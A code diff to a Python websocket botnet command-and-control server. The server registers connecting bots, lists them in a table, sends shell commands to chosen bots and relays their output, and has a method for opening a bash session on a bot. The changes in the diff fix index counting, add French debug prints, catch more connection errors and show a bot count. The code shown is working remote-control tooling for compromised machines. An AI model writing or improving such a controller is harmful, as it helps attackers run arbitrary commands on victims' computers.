@@ -15,7 +15,7 @@ from websockets.exceptions import ConnectionClosedError
 
 
 logger = logging.getLogger(__name__)
-bot_length = 0
+bot_length = 1
 
 CLI_OPTIONS  = f'{termcolor.colored("Enter:","red")}\n'
 CLI_OPTIONS += f'* "{termcolor.colored("0","yellow",attrs=["bold"])}" {termcolor.colored("- to print bot clients collection","red")}\n'
@@ -47,21 +47,22 @@ class Context:
 
     async def add_bot(self, ws: WebSocketConn):
         # First the client sends logged in user
+        global bot_length
         user = await ws.recv()
         try:
-            id = len(self.bots) + 1
+            id = bot_length
             remote_adr, _ = ws.remote_address
             new_bot = Bot(
                 id,
                 remote_adr,
                 ws,
-                user.strip("\n") if user else "--unknown--"
+                user.strip("\n") if user else "N/A"
             )
             if isNotListed(new_bot.remote_address, self.bots):
-                global bot_length
                 self.bots.append(new_bot)
                 logger.info(f"Added {new_bot}")
-                bot_length +=1 
+                bot_length = self.bots.index(self.bots[-1]) + 2
+                print(f'Longueur liste bot : {bot_length}')
                 #print(f"self.bots[0] : {self.bots[0]}")
                 #print(f"self.bots : {self.bots}")
                 #print(f'new_bot : {new_bot}')
@@ -78,13 +79,15 @@ class Context:
         if bot in self.bots:
             self.bots.remove(bot)
             logger.info(f"{bot} removed")
+            logger.info(f"Bots : {len(self.bots)}")
 
     def get_database_summary(self) -> str:
         x = PrettyTable()
+        bot_len = len(self.bots)
         x.field_names = [termcolor.colored("Index","yellow",attrs=["bold"]), termcolor.colored("Remote address","yellow",attrs=["bold"]), termcolor.colored("Logged as","yellow",attrs=["bold"])]
         for bot in self.bots:
             x.add_row([termcolor.colored(bot.idx,"yellow",attrs=["bold"]), termcolor.colored(bot.remote_address,"yellow",attrs=["bold"]), termcolor.colored(bot.user,"yellow",attrs=["bold"])])
-        return f"\n{x}"
+        return f'\n{x}\n{termcolor.colored("Bots :","cyan",attrs=["bold"])} {termcolor.colored(bot_len,"yellow",attrs=["bold"])}'
 
 
 class CommandControl:
@@ -105,7 +108,7 @@ class CommandControl:
             if bot:
                 await ws.keepalive_ping()
                 self.ctx.remove_bot_client(bot)
-        except websockets.exceptions.ConnectionClosedOK:
+        except (websockets.exceptions.ConnectionClosedOK,websockets.exceptions.ConnectionClosedError,OSError):
             pass
 
     async def execute_commands(self, ws: WebSocketConn, idxs: List[int]):
@@ -126,8 +129,7 @@ class CommandControl:
             stdout = await cur_bot.send_command(cmd)
             if stdout is False:
                 self.ctx.remove_bot_client(cur_bot)
-                await ws.send(
-                    f"Connection with bot {cur_bot} was closed...")
+                await ws.send(f"Connection with bot {cur_bot} was closed...")
             else:
                 stdout = f"Bot {termcolor.colored(bot_idx,'yellow',attrs=['bold'])} :\n {termcolor.colored(stdout,'green',attrs=['bold'])}"
                 await ws.send(stdout)
@@ -137,7 +139,10 @@ class CommandControl:
         print(f'Longueur de la chaine : {len(idxs)}')
         print(f'Contenu de la chaine : {idxs}')
         print(f'Test de print de la longueur des bots : {bot_length}')
-        await asyncio.gather(*[exec_command(i) for i in idxs])
+        try:
+            await asyncio.gather(*[exec_command(i) for i in idxs])
+        except OSError:
+            pass
 
     async def start_bash(self, ws: WebSocketConn, bot_idx: int):
         bot = self.ctx.get_bot(bot_idx)
